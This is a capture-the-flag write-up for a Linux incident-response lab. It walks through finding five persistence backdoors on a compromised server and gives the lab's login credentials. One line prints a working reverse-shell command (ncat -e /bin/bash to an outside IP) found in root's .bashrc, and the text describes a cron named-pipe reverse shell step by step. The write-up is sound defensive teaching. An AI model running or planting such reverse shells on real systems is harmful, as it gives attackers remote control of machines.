```
 .-') _      ('-.     _  .-')  _ .-') _                       _  .-')     ('-.     _ .-') _     ('-.   
(  OO) )    ( OO ).-.( \( -O )( (  OO) )                     ( \( -O )   ( OO ).-.( (  OO) )  _(  OO)  
/     '._   / . --. / ,------. \     .'_   ,-.-')   ,----.    ,------.   / . --. / \     .'_ (,------. 
|'--...__)  | \-.  \  |   /`. ',`'--..._)  |  |OO) '  .-./-') |   /`. '  | \-.  \  ,`'--..._) |  .---' 
'--.  .--'.-'-'  |  | |  /  | ||  |  \  '  |  |  \ |  |_( O- )|  /  | |.-'-'  |  | |  |  \  ' |  |     
   |  |    \| |_.'  | |  |_.' ||  |   ' |  |  |(_/ |  | .--, \|  |_.' | \| |_.'  | |  |   ' |(|  '--.  
   |  |     |  .-.  | |  .  '.'|  |   / : ,|  |_.'(|  | '. (_/|  .  '.'  |  .-.  | |  |   / : |  .--'  
   |  |     |  | |  | |  |\  \ |  '--'  /(_|  |    |  '--'  | |  |\  \   |  | |  | |  '--'  / |  `---. 
   `--'     `--' `--' `--' '--'`-------'   `--'     `------'  `--' '--'  `--' `--' `-------'  `------' 
```
A server has been compromised, and the security team has decided to isolate the machine
until it's been thoroughly cleaned up. Initial checks by the Incident Response team
revealed that there are five different backdoors. It's your job to find and remediate
them before giving the signal to bring the server back to production. Can you find all
the basic persistence mechanisms in this Linux endpoint? [^1]

QUESTION 1
-----------------------------------------------------------------------------------------
**What is the server's OS version?**

First, we start by connecting to the machine with `ssh` and the given user credentials
*giorgio* and *armani*. Upon successfully connecting to the server, we are prompted with
a welcome message with the operating system version.

QUESTION 2
-----------------------------------------------------------------------------------------
**What's the most interesting file you found in giorgio's home directory?**

A simple scan in giorgio's home directory with `ls` does not yield any result but then we
search with `ls -a` and discover a suspicious ELF 64-bit executable bash file under the
root userspace.

QUESTION 3
-----------------------------------------------------------------------------------------
**Another file that can be found in every user's home directory is the `.bashrc` file.
Can you check if you can find something interesting in giorgio's `.bashrc`?**

We open the `.bashrc` shell configuration file in an editor of our choice and then spot
a suspicious *alias* to change the `ls` command into a reverse shell backdoor. With
every directory listing, a hidden reverse shell is launched, error messages are supressed
and the real `ls` is run. Note, that the remote shell is not detected because it runs in
the background and redirects all inputs and outputs to a TCP connection.

QUESTION 4
-----------------------------------------------------------------------------------------
**It's time to check the scheduled tasks that he owns. Did you find anything interesting
about scheduled tasks?**

The `crontab -l` inspection lead us to the malicious task which seems to be linked to
the alias. The last scheduled task creates a persistent reverse shell backdoor to enable
remote command access. First, it is scheduled to run every minute to keep re-establishing
if it drops. Then, it deletes any existing file at `/tmp/f` and creates a named pipe at
its place. Finally, it sets up a loop to read input from the pipe, feed it into an
interactive shell, send any errors and output with it and then send everything to a
remote host. Since it's hidden in cron and runs automatically, it's hard to spot yet a
severe system compromise due to the full remote control and continuous reconnection.

QUESTION 5
-----------------------------------------------------------------------------------------
**This section is a bonus discussion on the importance of a dirty wordlist. Accept the
extra point and happy hunting!**

In this task, we have learned that dirty wordlists are used to collect everything that
helps lead the investigation forward. From any *Indicator of Compromise* (IOC) to random
notes. For the purpose of writeup we don't include all the dirty wordlist IOCs and
commands because we want to avoid spoilers but normally we would include them.

QUESTION 6
-----------------------------------------------------------------------------------------
**What does the error message in the terminal say after logging in to the root account?**

We log in to the root account with `sudo su` after entering the *armani* password. Then,
we patiently wait for a few seconds and observe a *Ncat* timeout error on the console.
  
QUESTION 7
-----------------------------------------------------------------------------------------
**What command was displayed in the terminal as part of the error message?**

After the error message was printed, we press enter to get back to our prompt but observe
an exit status to a command that is another reverse shell backdoor. In it the `ncat`
tool tries to attach a bash shell to the remote network connection.

QUESTION 8
-----------------------------------------------------------------------------------------
**Can you find out how the suspicious command has been implemented?**

Since we know, that the `.profile` file is commonly the first file to be run upon login
to a user, we investigate it in the root home directory. In it, we can not identify any
particularly harmful behaviour, except its sourcing of the `.bashrc` file.
```bash
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n 2> /dev/null || true
```
So, we further investigate the `.bashrc` file and with `tail` we can immediately spot
the `ncat` command that caused the previous error message as it tried to connect to a
possile C2 server or similar: `ncat -e /bin/bash 172.10.6.9 6969 &`

QUESTION 9
-----------------------------------------------------------------------------------------
**What is the last persistence mechanism to fit the adversary's goals?**

For this task, we investigate, among others the `/etc/passwd` file and discover an
unusual entry to a standard low-privilege user with root group access. This user can not
log in normally, since it's home directory is `/nonexistent`.

QUESTION 10
-----------------------------------------------------------------------------------------
**The adversary left a golden nugget of "advise" somewhere.**

From the previous task, we have seen the `/nonexistent` directory which contains a hidden
file `.youfoundme` with the flag.

[^1]: https://tryhackme.com/room/tardigrade
